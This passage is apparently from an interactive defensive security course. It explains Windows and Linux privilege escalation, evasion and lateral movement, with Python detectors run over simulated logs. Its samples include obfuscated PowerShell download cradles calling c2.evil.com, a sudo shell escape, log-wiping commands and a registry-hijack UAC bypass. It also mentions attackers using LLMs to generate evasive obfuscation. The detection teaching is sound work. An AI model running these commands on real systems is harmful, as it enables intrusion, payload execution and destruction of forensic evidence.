+def detect_lsass_access(event: dict) -&gt; dict | None:
+    if &quot;lsass.exe&quot; not in event.get(&quot;target_process&quot;, &quot;&quot;).lower():
+        return None
+    access = event.get(&quot;granted_access&quot;, &quot;&quot;).lower()
+    source = event.get(&quot;source_process&quot;, &quot;&quot;)
+
+    is_suspicious_access = access in [k.lower() for k in CREDENTIAL_DUMP_MASKS]
+    is_unknown_caller = source not in LSASS_LEGITIMATE_CALLERS
+
+    if is_suspicious_access and is_unknown_caller:
+        return {
+            &quot;alert&quot;: &quot;credential_dump_attempt&quot;,
+            &quot;technique&quot;: &quot;T1003.001&quot;,
+            &quot;source_process&quot;: source,
+            &quot;access_type&quot;: CREDENTIAL_DUMP_MASKS.get(access, &quot;unknown&quot;),
+        }
+    return None
+
+for event in LSASS_ACCESS_EVENTS:
+    result = detect_lsass_access(event)
+    if result:
+        print(f&quot;[ALERT] {result[&#x27;technique&#x27;]}: {result[&#x27;source_process&#x27;]} → {result[&#x27;access_type&#x27;]}&quot;)
+    else:
+        print(f&quot;[clean] {event[&#x27;source_process&#x27;]} accessed lsass normally&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>detect_process_hollowing_indicators(events: list) -&gt; list</code> that takes a list of Sysmon events and flags sequences indicating process hollowing: a process is created (EID 1) in a SUSPENDED state (detectable by <code>--suspended</code> in cmdline or CreateProcess flags), followed within 5 seconds by a CreateRemoteThread event (EID 8) targeting that same PID.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from datetime import datetime, timedelta
+
+hollow_events = [
+    {&quot;eid&quot;: 1, &quot;time&quot;: &quot;2024-04-10T04:00:00&quot;, &quot;process_name&quot;: &quot;svchost.exe&quot;,
+     &quot;pid&quot;: 4444, &quot;cmdline&quot;: &quot;svchost.exe&quot;, &quot;parent&quot;: &quot;malware.exe&quot;},
+    {&quot;eid&quot;: 8, &quot;time&quot;: &quot;2024-04-10T04:00:02&quot;, &quot;source_process&quot;: &quot;malware.exe&quot;,
+     &quot;target_pid&quot;: 4444, &quot;start_address&quot;: &quot;0x00007ff800000000&quot;},
+    {&quot;eid&quot;: 1, &quot;time&quot;: &quot;2024-04-10T04:01:00&quot;, &quot;process_name&quot;: &quot;notepad.exe&quot;,
+     &quot;pid&quot;: 5555, &quot;cmdline&quot;: &quot;notepad.exe readme.txt&quot;, &quot;parent&quot;: &quot;explorer.exe&quot;},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[ALERT] T1055.012 Process Hollowing: svchost.exe (PID 4444) — CreateRemoteThread 2s after spawn
+</code></pre><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> Automated malware analysis and technique identification<br />
+<strong>Threat:</strong> Attackers use LLMs to generate novel LOLBin abuse chains, write fileless payloads in PowerShell with obfuscation layers, and translate public PoC exploits into targeted variants tuned to evade specific AV signatures<br />
+<strong>Opportunity:</strong> Defenders feed suspicious command-line arguments or PowerShell script blocks to an LLM for instant de-obfuscation and technique identification — collapsing what used to take a malware analyst 30 minutes into seconds<br />
+<strong>Prompt to try:</strong> <code>&quot;De-obfuscate this PowerShell command and explain what it does step by step, then map each action to a MITRE ATT&amp;CK technique: [paste base64-encoded command]&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — Privilege Escalation and Defense Evasion</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="06-3"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=jsuQhY7sU0Y" target="_blank" rel="noopener"><b>Privilege Escalation On Windows - Know UAC bypass, Token Stealing</b><small>Malware-Reverse-Engineering-Made-Easy</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=privilege%20escalation%20techniques%20Windows%20Linux%20token%20impersonation%20UAC%20bypass" target="_blank" rel="noopener">privilege escalation techniques Windows Linux token impersonation UAC bypass</a></p></div>
+<hr />
+<h3>Concept 1 — Windows Privilege Escalation: Token Impersonation and UAC Bypass</h3>
+<p>Privilege escalation is the attacker moving from a limited user account to SYSTEM or Domain Admin. On Windows, two common paths: token impersonation and UAC bypass.</p>
+<p>Token impersonation: Windows uses access tokens to represent a user's security context. Processes running as SYSTEM (like IIS w3wp.exe or SQL Server) hold high-privilege tokens. If an attacker can inject into or call <code>ImpersonateLoggedOnUser</code> against such a process, they steal that token. The <code>SeImpersonatePrivilege</code> right is the enabling condition — IIS application pool accounts have this by default, which is why web shell → SYSTEM is a classic escalation path (Potato attacks exploit this).</p>
+<p>UAC bypass: UAC is the Windows prompt that asks &quot;do you want to allow this app to make changes?&quot; Some COM objects and executables are auto-elevated (they have <code>autoElevate: true</code> in their manifest) and are not checked by UAC. If an attacker can hijack the DLL load order or registry key that one of these processes reads, code runs elevated with no prompt.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Simulated Windows Security event log entries for token impersonation detection
+IMPERSONATION_EVENTS = [
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T05:00:00&quot;, &quot;logon_type&quot;: 3,
+     &quot;subject_user&quot;: &quot;IUSR&quot;, &quot;target_user&quot;: &quot;Administrator&quot;,
+     &quot;impersonation_level&quot;: &quot;Impersonation&quot;,  # 2 = Impersonation, 3 = Delegation
+     &quot;process_name&quot;: &quot;w3wp.exe&quot;},
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T05:01:00&quot;, &quot;logon_type&quot;: 2,
+     &quot;subject_user&quot;: &quot;alice&quot;, &quot;target_user&quot;: &quot;alice&quot;,
+     &quot;impersonation_level&quot;: &quot;Identification&quot;,
+     &quot;process_name&quot;: &quot;explorer.exe&quot;},
+    {&quot;eid&quot;: 4672, &quot;time&quot;: &quot;2024-04-10T05:00:01&quot;,
+     &quot;user&quot;: &quot;Administrator&quot;,
+     &quot;special_privileges&quot;: [&quot;SeDebugPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;,
+                             &quot;SeTcbPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;]},
+]
+
+HIGH_VALUE_PRIVILEGES = {
+    &quot;SeDebugPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;,
+    &quot;SeTcbPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;, &quot;SeAssignPrimaryTokenPrivilege&quot;
+}
+
+def detect_token_abuse(events: list) -&gt; list:
+    alerts = []
+    for event in events:
+        if event[&quot;eid&quot;] == 4624:
+            if (event.get(&quot;impersonation_level&quot;) == &quot;Impersonation&quot;
+                    and event[&quot;subject_user&quot;] != event[&quot;target_user&quot;]):
+                alerts.append({
+                    &quot;type&quot;: &quot;token_impersonation&quot;,
+                    &quot;technique&quot;: &quot;T1134.001&quot;,
+                    &quot;from&quot;: event[&quot;subject_user&quot;],
+                    &quot;to&quot;: event[&quot;target_user&quot;],
+                    &quot;via&quot;: event[&quot;process_name&quot;],
+                })
+        elif event[&quot;eid&quot;] == 4672:
+            granted = set(event.get(&quot;special_privileges&quot;, []))
+            dangerous = granted &amp; HIGH_VALUE_PRIVILEGES
+            if len(dangerous) &gt;= 2:
+                alerts.append({
+                    &quot;type&quot;: &quot;high_privilege_assignment&quot;,
+                    &quot;technique&quot;: &quot;T1134&quot;,
+                    &quot;user&quot;: event[&quot;user&quot;],
+                    &quot;privileges&quot;: list(dangerous),
+                })
+    return alerts
+
+for alert in detect_token_abuse(IMPERSONATION_EVENTS):
+    print(f&quot;[{alert[&#x27;technique&#x27;]}] {alert[&#x27;type&#x27;]}: {alert}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>detect_uac_bypass(events: list) -&gt; list</code> that flags UAC bypass indicators: a process with a non-elevated parent (medium integrity level) writing to a registry key in <code>HKCU:\SOFTWARE\Classes</code> or <code>HKCU:\Environment</code> (Sysmon EID 13), followed within 10 seconds by an auto-elevated Windows binary (fodhelper.exe, eventvwr.exe, sdclt.exe, computerdefaults.exe) executing from that user's session.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>uac_events = [
+    {&quot;eid&quot;: 13, &quot;time&quot;: &quot;2024-04-10T06:00:00&quot;, &quot;process&quot;: &quot;cmd.exe&quot;,
+     &quot;registry_key&quot;: &quot;HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command&quot;,
+     &quot;value&quot;: &quot;cmd.exe /c C:\\payload.exe&quot;},
+    {&quot;eid&quot;: 1, &quot;time&quot;: &quot;2024-04-10T06:00:03&quot;, &quot;process_name&quot;: &quot;fodhelper.exe&quot;,
+     &quot;parent&quot;: &quot;cmd.exe&quot;, &quot;integrity_level&quot;: &quot;High&quot;},
+    {&quot;eid&quot;: 1, &quot;time&quot;: &quot;2024-04-10T06:01:00&quot;, &quot;process_name&quot;: &quot;notepad.exe&quot;,
+     &quot;parent&quot;: &quot;explorer.exe&quot;, &quot;integrity_level&quot;: &quot;Medium&quot;},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[ALERT] T1548.002 UAC Bypass via fodhelper.exe — registry staging detected 3s prior
+</code></pre><hr />
+<h3>Concept 2 — Linux Privilege Escalation: SUID Binaries and Sudo Misconfigurations</h3>
+<p>On Linux, privilege escalation often exploits SUID binaries or <code>sudo</code> misconfigurations. A SUID binary runs with the file owner's permissions regardless of who calls it — if root owns it, it runs as root. Attackers find SUID binaries that allow arbitrary code execution (bash, vim, python, find, nmap) on GTFOBins.</p>
+<p><code>sudo</code> misconfigurations: a sudoers entry like <code>alice ALL=(ALL) NOPASSWD: /usr/bin/python3</code> lets alice run python3 as root, which trivially escalates: <code>sudo python3 -c &quot;import os; os.system('/bin/bash')&quot;</code>.</p>
+<p>Detection: <code>find / -perm -4000 -user root</code> baseline on system build, alert on any new SUID file appearing. Monitor <code>/var/log/auth.log</code> for <code>sudo</code> sessions where the command is an interpreter or text editor.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+
+# Simulated auditd EXECVE records — already parsed from raw auditd log
+AUDITD_EVENTS = [
+    {&quot;time&quot;: &quot;2024-04-10T07:00:00&quot;, &quot;uid&quot;: 1001, &quot;euid&quot;: 0,
+     &quot;syscall&quot;: &quot;execve&quot;, &quot;exe&quot;: &quot;/usr/bin/find&quot;,
+     &quot;args&quot;: [&quot;/&quot;, &quot;-name&quot;, &quot;flag.txt&quot;, &quot;-exec&quot;, &quot;/bin/sh&quot;, &quot;-p&quot;, &quot;;&quot;]},
+    {&quot;time&quot;: &quot;2024-04-10T07:01:00&quot;, &quot;uid&quot;: 1001, &quot;euid&quot;: 1001,
+     &quot;syscall&quot;: &quot;execve&quot;, &quot;exe&quot;: &quot;/usr/bin/ls&quot;, &quot;args&quot;: [&quot;-la&quot;]},
+    {&quot;time&quot;: &quot;2024-04-10T07:02:00&quot;, &quot;uid&quot;: 1001, &quot;euid&quot;: 0,
+     &quot;syscall&quot;: &quot;execve&quot;, &quot;exe&quot;: &quot;/usr/bin/python3&quot;,
+     &quot;args&quot;: [&quot;-c&quot;, &quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot;]},
+]
+
+GTFOBINS = {
+    &quot;/usr/bin/find&quot;, &quot;/usr/bin/python3&quot;, &quot;/usr/bin/python&quot;,
+    &quot;/usr/bin/vim&quot;, &quot;/usr/bin/vi&quot;, &quot;/usr/bin/nmap&quot;,
+    &quot;/usr/bin/perl&quot;, &quot;/usr/bin/ruby&quot;, &quot;/usr/bin/awk&quot;,
+    &quot;/usr/bin/env&quot;, &quot;/bin/bash&quot;, &quot;/usr/bin/less&quot;,
+}
+
+def detect_suid_abuse(events: list) -&gt; list:
+    alerts = []
+    for event in events:
+        uid = event.get(&quot;uid&quot;, -1)
+        euid = event.get(&quot;euid&quot;, -1)
+        exe = event.get(&quot;exe&quot;, &quot;&quot;)
+        # SUID abuse: process runs as root (euid=0) but was launched by non-root user
+        if euid == 0 and uid != 0 and exe in GTFOBINS:
+            alerts.append({
+                &quot;technique&quot;: &quot;T1548.001&quot;,
+                &quot;alert&quot;: &quot;SUID GTFOBin abuse&quot;,
+                &quot;binary&quot;: exe,
+                &quot;calling_uid&quot;: uid,
+                &quot;args&quot;: event.get(&quot;args&quot;, []),
+            })
+    return alerts
+
+for alert in detect_suid_abuse(AUDITD_EVENTS):
+    print(f&quot;[{alert[&#x27;technique&#x27;]}] {alert[&#x27;alert&#x27;]}: {alert[&#x27;binary&#x27;]} called by UID {alert[&#x27;calling_uid&#x27;]}&quot;)
+    print(f&quot;  args: {alert[&#x27;args&#x27;]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>parse_sudoers_risks(sudoers_text: str) -&gt; list</code> that reads sudoers file content as a string and returns a list of risky rules. A rule is risky if it grants <code>NOPASSWD</code> access to any interpreter (python, perl, ruby, bash, sh, awk, vim, less, more, nano) or grants <code>ALL</code> commands with no <code>NOPASSWD</code> to a non-root user from ALL hosts.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>sudoers_sample = &quot;&quot;&quot;
+root    ALL=(ALL:ALL) ALL
+alice   ALL=(ALL) NOPASSWD: /usr/bin/python3
+bob     ALL=(ALL) NOPASSWD: /usr/bin/apt
+charlie ALL=(ALL) ALL
+www-data ALL=(root) NOPASSWD: /usr/sbin/service nginx restart
+&quot;&quot;&quot;
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[HIGH] alice: NOPASSWD interpreter — /usr/bin/python3 (T1548.003)
+[MEDIUM] charlie: unrestricted sudo (requires password but no command restriction)
+</code></pre><hr />
+<h3>Concept 3 — Defense Evasion: Obfuscation and Log Clearing</h3>
+<p>Once an attacker has elevated privileges, they try to avoid detection and cover their tracks. Two primary techniques: obfuscation (making malicious code harder to signature-detect) and log clearing (destroying forensic evidence).</p>
+<p>Obfuscation on Windows: PowerShell <code>Invoke-Expression</code> with backtick insertion (<code>I</code>E<code>X</code>), string concatenation (<code>&quot;power&quot;+&quot;shell&quot;</code>), char-code concatenation (<code>[char]73+[char]69+[char]88</code>), <code>-EncodedCommand</code>. These all bypass signature-based detection while executing the same code.</p>
+<p>Log clearing: Windows <code>wevtutil cl Security</code> (EID 1102 — audit log cleared), Linux <code>echo &gt; /var/log/auth.log</code> or <code>shred -u /var/log/auth.log</code>. Alert: EID 1102 is itself logged when the Security log is cleared, giving you one event as evidence.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import re
+
+# PowerShell obfuscation deobfuscator (simplified)
+def deobfuscate_powershell(cmdline: str) -&gt; str:
+    &quot;&quot;&quot;Strip common PowerShell obfuscation layers to reveal intent.&quot;&quot;&quot;
+    result = cmdline
+
+    # Remove backtick insertions: I`E`X → IEX
+    result = re.sub(r&quot;`(.)&quot;, r&quot;\1&quot;, result)
+
+    # Decode -EncodedCommand if present
+    enc_match = re.search(r&quot;-[Ee]nc(?:odedCommand)?\s+([A-Za-z0-9+/=]+)&quot;, result)
+    if enc_match:
+        import base64
+        try:
+            decoded = base64.b64decode(enc_match.group(1)).decode(&quot;utf-16-le&quot;, errors=&quot;ignore&quot;)
+            result = result[:enc_match.start()] + decoded
+        except Exception:
+            pass
+
+    # Collapse obvious string concatenation: &quot;pow&quot;+&quot;er&quot; → &quot;power&quot;
+    result = re.sub(r&#x27;&quot;([^&quot;]+)&quot;\s*\+\s*&quot;([^&quot;]+)&quot;&#x27;, lambda m: f&#x27;&quot;{m.group(1)}{m.group(2)}&quot;&#x27;, result)
+
+    return result
+
+DANGEROUS_KEYWORDS = re.compile(
+    r&quot;(IEX|Invoke-Expression|DownloadString|WebClient|Net\.WebClient&quot;
+    r&quot;|AmsiUtils|amsiInitFailed|Bypass|unrestricted|Hidden|NoProfile)&quot;,
+    re.IGNORECASE
+)
+
+obfuscated_samples = [
+    &quot;I`E`X (New-Object Net.WebClient).DownloadString(&#x27;http://c2.evil.com/payload&#x27;)&quot;,
+    &quot;powershell -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQBiAGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA&quot;,
+    &quot;Get-Process | Where-Object {$_.CPU -gt 50}&quot;,
+]
+
+for sample in obfuscated_samples:
+    clean = deobfuscate_powershell(sample)
+    if DANGEROUS_KEYWORDS.search(clean):
+        print(f&quot;[MALICIOUS] {clean[:80]}...&quot;)
+    else:
+        print(f&quot;[clean] {clean[:80]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>detect_log_clearing(events: list) -&gt; list</code> that scans a list of parsed Windows event log entries for log-clearing indicators. Flag: EID 1102 (Security log cleared), EID 104 (System log cleared), and EID 4719 (system audit policy changed to disable auditing — <code>AuditPolicyChanges</code> contains <code>%%8448</code> meaning &quot;No Auditing&quot;).</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>clearing_events = [
+    {&quot;eid&quot;: 1102, &quot;time&quot;: &quot;2024-04-10T08:00:00&quot;, &quot;channel&quot;: &quot;Security&quot;,
+     &quot;user&quot;: &quot;SYSTEM&quot;, &quot;message&quot;: &quot;The audit log was cleared.&quot;},
+    {&quot;eid&quot;: 4719, &quot;time&quot;: &quot;2024-04-10T08:01:00&quot;, &quot;channel&quot;: &quot;Security&quot;,
+     &quot;user&quot;: &quot;Administrator&quot;, &quot;subcategory&quot;: &quot;Logon&quot;,
+     &quot;audit_policy_changes&quot;: &quot;%%8448&quot;},
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T08:02:00&quot;, &quot;channel&quot;: &quot;Security&quot;,
+     &quot;user&quot;: &quot;alice&quot;},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[ALERT] T1070.001 EID 1102: Security log cleared by SYSTEM at 2024-04-10T08:00:00
+[ALERT] T1562.002 EID 4719: Audit policy disabled (Logon) by Administrator at 2024-04-10T08:01:00
+</code></pre><hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> Automated obfuscation detection and deobfuscation<br />
+<strong>Threat:</strong> Attackers use LLMs to generate novel obfuscation variants that defeat regex-based detection signatures, mutating known malware patterns to bypass AV while preserving functionality<br />
+<strong>Opportunity:</strong> Defenders pipe suspicious scripts to an LLM for semantic analysis — even heavily obfuscated code is deobfuscated and described in plain English, catching techniques that no regex could anticipate<br />
+<strong>Prompt to try:</strong> <code>&quot;Analyze this PowerShell script for malicious behavior. Deobfuscate it step by step, identify what it does, rate the severity (low/medium/high/critical), and map each action to a MITRE ATT&amp;CK technique ID: [paste script]&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — Lateral Movement and Collection</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="06-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=7bxyWOQuj9c" target="_blank" rel="noopener"><b>Attack Tutorial: How a Pass the Hash Attack Works</b><small>Netwrix</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=lateral%20movement%20techniques%20pass%20the%20hash%20PsExec%20WMI%20credential%20access%20detection" target="_blank" rel="noopener">lateral movement techniques pass the hash PsExec WMI credential access detection</a></p></div>
+<hr />
+<h3>Concept 1 — Lateral Movement: Pass-the-Hash and Remote Services</h3>
+<p>After escalating privileges, the attacker moves laterally — compromising other hosts on the network. Pass-the-Hash (PtH) uses a stolen NTLM hash instead of a cleartext password to authenticate to remote hosts. Because Windows NTLM authentication only verifies the hash, you do not need to crack it.</p>
+<p>Remote services used for lateral movement: PsExec (creates a service on the target via SMB, runs commands as SYSTEM), WMI (<code>wmic /node:target process call create &quot;cmd.exe&quot;</code>), PowerShell Remoting (WinRM port 5985/5986), and DCOM.</p>
+<p>Detection: Event 4648 (explicit credential logon — using credentials other than current session), EID 4624 Type 3 (network logon) from unexpected source IPs, SMB named pipe creation (Sysmon EID 18 for PSEXESVC), network connection from management binaries (psexec.exe, wmic.exe).</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from collections import defaultdict
+from datetime import datetime
+
+# Simulated network logon events (EID 4624 Type 3)
+NETWORK_LOGONS = [
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T09:00:00&quot;, &quot;logon_type&quot;: 3,
+     &quot;user&quot;: &quot;Administrator&quot;, &quot;src_ip&quot;: &quot;10.0.0.5&quot;, &quot;dest_host&quot;: &quot;DC01&quot;,
+     &quot;auth_package&quot;: &quot;NTLM&quot;, &quot;workstation&quot;: &quot;WORKSTATION01&quot;},
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T09:00:10&quot;, &quot;logon_type&quot;: 3,
+     &quot;user&quot;: &quot;Administrator&quot;, &quot;src_ip&quot;: &quot;10.0.0.5&quot;, &quot;dest_host&quot;: &quot;FS01&quot;,
+     &quot;auth_package&quot;: &quot;NTLM&quot;, &quot;workstation&quot;: &quot;WORKSTATION01&quot;},
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T09:00:20&quot;, &quot;logon_type&quot;: 3,
+     &quot;user&quot;: &quot;Administrator&quot;, &quot;src_ip&quot;: &quot;10.0.0.5&quot;, &quot;dest_host&quot;: &quot;SQL01&quot;,
+     &quot;auth_package&quot;: &quot;NTLM&quot;, &quot;workstation&quot;: &quot;WORKSTATION01&quot;},
+    {&quot;eid&quot;: 4624, &quot;time&quot;: &quot;2024-04-10T09:01:00&quot;, &quot;logon_type&quot;: 3,
+     &quot;user&quot;: &quot;alice&quot;, &quot;src_ip&quot;: &quot;10.0.0.20&quot;, &quot;dest_host&quot;: &quot;FILESERVER&quot;,
+     &quot;auth_package&quot;: &quot;Kerberos&quot;, &quot;workstation&quot;: &quot;ALICE-PC&quot;},
+]
+
+def detect_lateral_movement_pth(events: list, time_window_seconds: int = 60,
+                                  host_threshold: int = 3) -&gt; list:
+    &quot;&quot;&quot;Flag: same user + NTLM + multiple destination hosts in a short window.&quot;&quot;&quot;
+    sessions = defaultdict(list)
+    for event in events:
+        if event.get(&quot;logon_type&quot;) == 3 and event.get(&quot;auth_package&quot;) == &quot;NTLM&quot;:
+            key = (event[&quot;user&quot;], event[&quot;src_ip&quot;])
+            sessions[key].append({
+                &quot;time&quot;: datetime.fromisoformat(event[&quot;time&quot;]),
+                &quot;dest&quot;: event[&quot;dest_host&quot;],
+            })
+
+    alerts = []
+    for (user, src_ip), sessions_list in sessions.items():
+        sessions_list.sort(key=lambda x: x[&quot;time&quot;])
+        first = sessions_list[0][&quot;time&quot;]
+        last = sessions_list[-1][&quot;time&quot;]
+        span = (last - first).total_seconds()
+        if len(sessions_list) &gt;= host_threshold and span &lt;= time_window_seconds:
+            alerts.append({
+                &quot;technique&quot;: &quot;T1550.002&quot;,
+                &quot;alert&quot;: &quot;pass_the_hash_lateral_movement&quot;,
+                &quot;user&quot;: user,
+                &quot;src_ip&quot;: src_ip,
+                &quot;hosts_accessed&quot;: [s[&quot;dest&quot;] for s in sessions_list],
+                &quot;span_seconds&quot;: span,
+            })
+    return alerts
+
+for alert in detect_lateral_movement_pth(NETWORK_LOGONS):
+    print(f&quot;[{alert[&#x27;technique&#x27;]}] {alert[&#x27;user&#x27;]} from {alert[&#x27;src_ip&#x27;]} → {alert[&#x27;hosts_accessed&#x27;]}&quot;)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>detect_psexec(events: list) -&gt; list</code> that identifies PsExec usage by correlating: Sysmon EID 18 (named pipe connected) where the pipe name contains <code>PSEXESVC</code>, AND/OR Sysmon EID 11 (file created) for a file named <code>PSEXESVC.exe</code> in <code>C:\Windows\</code>, AND/OR EID 7045 (service installed) for service name <code>PSEXESVC</code>.</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>psexec_events = [
+    {&quot;eid&quot;: 7045, &quot;time&quot;: &quot;2024-04-10T10:00:00&quot;, &quot;service_name&quot;: &quot;PSEXESVC&quot;,
+     &quot;service_path&quot;: &quot;C:\\Windows\\PSEXESVC.exe&quot;, &quot;start_type&quot;: &quot;demand&quot;},
+    {&quot;eid&quot;: 18, &quot;time&quot;: &quot;2024-04-10T10:00:01&quot;, &quot;pipe_name&quot;: &quot;\\PSEXESVC&quot;,
+     &quot;src_process&quot;: &quot;psexec.exe&quot;},
+    {&quot;eid&quot;: 11, &quot;time&quot;: &quot;2024-04-10T10:00:00&quot;, &quot;file_path&quot;: &quot;C:\\Windows\\PSEXESVC.exe&quot;,
+     &quot;process&quot;: &quot;System&quot;},
+    {&quot;eid&quot;: 7045, &quot;time&quot;: &quot;2024-04-10T10:01:00&quot;, &quot;service_name&quot;: &quot;LegitSvc&quot;,
+     &quot;service_path&quot;: &quot;C:\\Program Files\\Corp\\svc.exe&quot;, &quot;start_type&quot;: &quot;auto&quot;},
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p>Expected output:</p>
+<pre><code>[ALERT] T1569.002 PsExec: service PSEXESVC installed (EID 7045)
+[ALERT] T1569.002 PsExec: named pipe \\PSEXESVC connected (EID 18)
+[ALERT] T1569.002 PsExec: PSEXESVC.exe dropped to C:\Windows (EID 11)
+</code></pre><hr />
+<h3>Concept 2 — Credential Access: Kerberoasting and DCSync</h3>
+<p>Two advanced credential attacks that work against Active Directory without requiring admin rights at the starting point.</p>
+<p>Kerberoasting: any authenticated domain user can request a Kerberos service ticket (TGS) for any Service Principal Name (SPN). The TGS is encrypted with the service account's NTLM hash. The attacker requests tickets for all SPNs, takes them offline, and cracks with hashcat. High-value targets: SQL service accounts, IIS app pool accounts, backup service accounts — these often have weak passwords and never expire.</p>
+<p>DCSync: the attacker impersonates a Domain Controller's replication request using the <code>DS-Replication-Get-Changes-All</code> permission. This causes a real DC to send all password hashes — equivalent to running <code>ntdsutil</code> without physical access to the DC. Requires DA or Account Operators privileges (or delegated replication rights). Detection: EID 4662 (object operation on directory — AD) with specific GUIDs that indicate replication rights.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Kerberoasting detection: EID 4769 (Kerberos TGS request) with RC4 encryption (enc type 0x17)
+KERBEROS_EVENTS = [
+    {&quot;eid&quot;: 4769, &quot;time&quot;: &quot;2024-04-10T11:00:00&quot;, &quot;user&quot;: &quot;alice&quot;,
+     &quot;service&quot;: &quot;MSSQLSvc/sqlserver.corp.local:1433&quot;,
+     &quot;ticket_encryption_type&quot;: &quot;0x17&quot;,  # RC4 = crackable offline
+     &quot;client_ip&quot;: &quot;10.0.0.5&quot;},
+    {&quot;eid&quot;: 4769, &quot;time&quot;: &quot;2024-04-10T11:00:01&quot;, &quot;user&quot;: &quot;alice&quot;,
+     &quot;service&quot;: &quot;HTTP/webserver.corp.local&quot;,
+     &quot;ticket_encryption_type&quot;: &quot;0x17&quot;,
+     &quot;client_ip&quot;: &quot;10.0.0.5&quot;},
+    {&quot;eid&quot;: 4769, &quot;time&quot;: &quot;2024-04-10T11:00:02&quot;, &quot;user&quot;: &quot;alice&quot;,
+     &quot;service&quot;: &quot;cifs/fileserver.corp.local&quot;,
+     &quot;ticket_encryption_type&quot;: &quot;0x12&quot;,  # AES256 = not crackable offline
+     &quot;client_ip&quot;: &quot;10.0.0.5&quot;},
+    {&quot;eid&quot;: 4769, &quot;time&quot;: &quot;2024-04-10T11:01:00&quot;, &quot;user&quot;: &quot;bob&quot;,
+     &quot;service&quot;: &quot;MSSQLSvc/sqlserver.corp.local:1433&quot;,
+     &quot;ticket_encryption_type&quot;: &quot;0x12&quot;,
+     &quot;client_ip&quot;: &quot;10.0.0.20&quot;},
+]
+
+from collections import defaultdict
+
+def detect_kerberoasting(events: list, rc4_threshold: int = 2) -&gt; list:
+    &quot;&quot;&quot;Flag users requesting multiple RC4-encrypted TGS tickets (T1558.003).&quot;&quot;&quot;
+    rc4_requests = defaultdict(list)
+    for event in events:
